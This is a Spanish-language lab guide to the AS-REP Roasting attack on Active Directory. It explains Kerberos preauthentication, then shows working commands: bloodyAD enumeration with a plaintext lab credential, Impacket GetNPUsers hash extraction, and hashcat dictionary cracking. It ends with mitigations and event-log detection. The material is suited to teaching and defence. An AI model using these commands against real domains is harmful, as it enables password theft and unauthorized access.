# Ataques Kerberos: AS-REP Roasting

Guía práctica sobre el ataque **AS-REP Roasting** en Active Directory: fundamentos del protocolo Kerberos, configuración de una cuenta vulnerable en Windows Server, enumeración con bloodyAD, extracción del ticket con GetNPUsers y cracking offline con Hashcat.

---

## ¿Qué es AS-REP Roasting?

**AS-REP Roasting** es una técnica de ataque contra el protocolo de autenticación Kerberos que permite a un atacante solicitar material de autenticación para cuentas de usuario que tengan deshabilitada la preautenticación Kerberos, con el objetivo de crackear sus contraseñas de forma offline y sin generar bloqueos de cuenta.

### ¿Cómo funciona la Preautenticación Kerberos?

En el flujo normal de Kerberos:
1. El cliente envía un mensaje `AS-REQ` al KDC (Key Distribution Center).
2. Para demostrar que conoce su contraseña, el cliente cifra una marca de tiempo (*timestamp*) con una clave derivada de su propia contraseña (**Pre-Authentication**).
3. Si la marca de tiempo se descifra correctamente, el KDC responde con un `AS-REP` que contiene el Ticket Granting Ticket (TGT) y una sesión cifrada con la clave del usuario.

### El Problema: `DONT_REQ_PREAUTH`

Cuando un usuario tiene habilitado el atributo **`DONT_REQ_PREAUTH`** (`Do not require Kerberos preauthentication`, correspondiente al valor `0x400000` o `4194304` en `userAccountControl`):
- **Cualquier atacante puede solicitar un `AS-REQ` para ese usuario sin conocer su contraseña ni enviar ninguna preautenticación**.
- El KDC responde inmediatamente con un mensaje `AS-REP` legítimo.
- Parte de este mensaje `AS-REP` está cifrado con la clave secreta derivada de la contraseña del usuario objetivo.
- El atacante captura esta respuesta y puede intentar romperla **offline mediante fuerza bruta o ataques de diccionario** sin interactuar más con el Controlador de Dominio.

---

## 1. Configuración del Laboratorio en Windows Server

Para recrear el escenario vulnerable en nuestro entorno de pruebas:

Abrimos la consola de administración de usuarios ejecutando `dsa.msc` (`Win + R`):

![Consola dsa.msc](assets/Pasted%20image%2020261014225118.png)

Localizamos el usuario objetivo (en nuestro caso `jose`), hacemos clic derecho y seleccionamos **Properties** (Propiedades):

![Propiedades del Usuario](assets/Pasted%20image%2020261014225313.png)

Nos dirigimos a la pestaña **Account** y en la sección *Account options* marcamos la casilla **Do not require Kerberos preauthentication**:

![Do not require Kerberos preauthentication](assets/Pasted%20image%2020261014225401.png)

Hacemos clic en **Apply** y **OK**. A partir de este momento, la cuenta queda expuesta a ataques AS-REP Roasting.

---

## 2. Enumeración de Cuentas Vulnerables con bloodyAD

Desde nuestra máquina de auditoría Linux podemos enumerar las cuentas del dominio que tengan deshabilitada la preautenticación.

Utilizamos **bloodyAD** aplicando un filtro LDAP bitwise sobre `userAccountControl`:

```bash
bloodyAD -u mike -p '1725j@vik' -d domain.com --host 192.168.100.50 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

> [!NOTE]
> **Desglose del filtro LDAP:**
> - `userAccountControl:1.2.840.113556.1.4.803:=4194304`: Comprueba mediante la regla `LDAP_MATCHING_RULE_BIT_AND` si el bit `DONT_REQ_PREAUTH` (4194304) está activo.
> - `!(UserAccountControl:1.2.840.113556.1.4.803:=2)`: Excluye cuentas que se encuentren deshabilitadas (`ACCOUNTDISABLE`).

![Salida bloodyAD](assets/Pasted%20image%2020261014230659.png)

Obtenemos el usuario vulnerable identificado:

```text
distinguishedName: CN=jose,OU=lab-users,DC=domain,DC=com
sAMAccountName: jose
```

---

## 3. Extracción del Hash con GetNPUsers

Utilizamos el script **GetNPUsers.py** de Impacket para solicitar el mensaje `AS-REP` para el usuario `jose` sin proporcionar contraseña:

```bash
GetNPUsers.py -no-pass domain.com/jose -format hashcat -outputfile hash.txt
```

![GetNPUsers Solicitud AS-REP](assets/Pasted%20image%2020261014231358.png)

GetNPUsers guarda el hash en formato compatible con Hashcat (`$krb5asrep$23$...`).

---

## 4. Cracking Offline con Hashcat

Procedemos a romper el hash de forma offline utilizando el modo `18200` de **Hashcat** (Kerberos 5, etype 23, AS-REP) y el diccionario `rockyou.txt`:

```bash
hashcat -m 18200 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Hashcat Cracking](assets/Pasted%20image%2020261014231621.png)

Verificamos el resultado obtenido:

![Contraseña Obtenida](assets/Pasted%20image%2020261014231649.png)

La contraseña ha sido descifrada exitosamente mediante el ataque de diccionario offline.

---

## Medidas de Mitigación

Para proteger las cuentas de dominio frente a AS-REP Roasting:

1. **Habilitar Preautenticación Kerberos**:  
   Verificar que ninguna cuenta de usuario tenga activada la opción *"Do not require Kerberos preauthentication"*. La preautenticación debe ser obligatoria para todas las cuentas en entornos de producción.
2. **Políticas de Contraseñas Robustas**:  
   Si por requerimientos heredados alguna cuenta de servicio debe mantener la preautenticación deshabilitada, se debe exigir una contraseña de más de 25 caracteres generada aleatoriamente para evitar que sea susceptible a ataques por diccionario o fuerza bruta.
3. **Monitoreo y Detección**:  
   Monitorear eventos en el Controlador de Dominio como el Event ID `4768` (A Kerberos authentication ticket (TGT) was requested) donde el tipo de preautenticación figure como `0` o inexistente.

![Conclusión AS-REP Roasting](assets/Pasted%20image%2020261014232142.png)
